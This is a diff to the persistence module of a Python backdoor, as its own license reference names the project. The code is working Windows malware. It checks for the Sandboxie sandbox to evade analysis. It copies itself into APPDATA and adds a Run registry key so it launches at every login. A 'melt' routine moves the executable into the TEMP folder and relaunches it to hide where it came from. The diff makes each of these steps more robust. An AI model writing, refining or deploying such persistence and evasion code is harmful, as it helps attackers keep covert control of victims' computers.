@@ -7,14 +7,20 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 
 import ctypes
+import os
 import shutil
 import subprocess
+import sys
 import winreg
 
 import wmi
 
 from src import errors
-from src.defs import *
+
+TMP = os.path.normpath(os.environ["TEMP"])  # tmp location
+COPY_LOCATION = os.path.normpath(os.environ["APPDATA"])  # appdata location
+REG_STARTUP_NAME = "pb"  # reg value name
+FILE_PATH = os.path.realpath(sys.argv[0])  # file path to self
 
 
 def detect_sandboxie():
@@ -47,29 +53,34 @@ def remove_from_startup():
 def add_startup():
     try:
         app_path = os.path.join(COPY_LOCATION, os.path.basename(FILE_PATH))
-        if not os.getcwd() == COPY_LOCATION:
-            shutil.copyfile(FILE_PATH, app_path)
+
+        if not os.path.normpath(os.path.dirname(FILE_PATH)) == COPY_LOCATION:
+            try:
+                shutil.copyfile(FILE_PATH, app_path)
+            except Exception as e:
+                raise WindowsError(e)
 
         regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
-        winreg.SetValueEx(regkey, REG_STARTUP_NAME, 0, winreg.REG_SZ, app_path)
+        winreg.SetValueEx(regkey, REG_STARTUP_NAME, 0, winreg.REG_SZ, f"\"{app_path}\"")
         winreg.CloseKey(regkey)
     except WindowsError as e:
         raise errors.ClientSocket.Persistence.StartupError(f"Unable to add to startup {e}")
 
 
 def melt():
-    path = os.path.join(TMP, MELT_FOLDER_NAME)
-    # ignore if the path is in copy folder as well
-    if not (os.getcwd() == path) and not (os.getcwd() == COPY_LOCATION):
-        if not os.path.exists(path):
+    # ignore if the path is in copy folder (used for startup) as well
+
+    curr_file_dir = os.path.normpath(os.path.dirname(FILE_PATH))
+    if not (curr_file_dir == TMP or curr_file_dir == COPY_LOCATION):
+        if not os.path.exists(TMP):
             try:
-                os.mkdir(path)
+                os.mkdir(TMP)
             except OSError:  # if there is a problem creating the folder, don't melt
                 return
 
-        new_file = os.path.join(path, os.path.basename(sys.argv[0]))
+        new_file = os.path.join(TMP, os.path.basename(FILE_PATH))
 
-        command = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {new_file} & cd /d {path}\\ & {new_file}"
+        command = f"timeout 2 & move /y \"{FILE_PATH}\" \"{new_file}\" & cd /d \"{TMP}\" & \"{new_file}\""
         subprocess.Popen(command, shell=True)
         sys.exit(0)
 
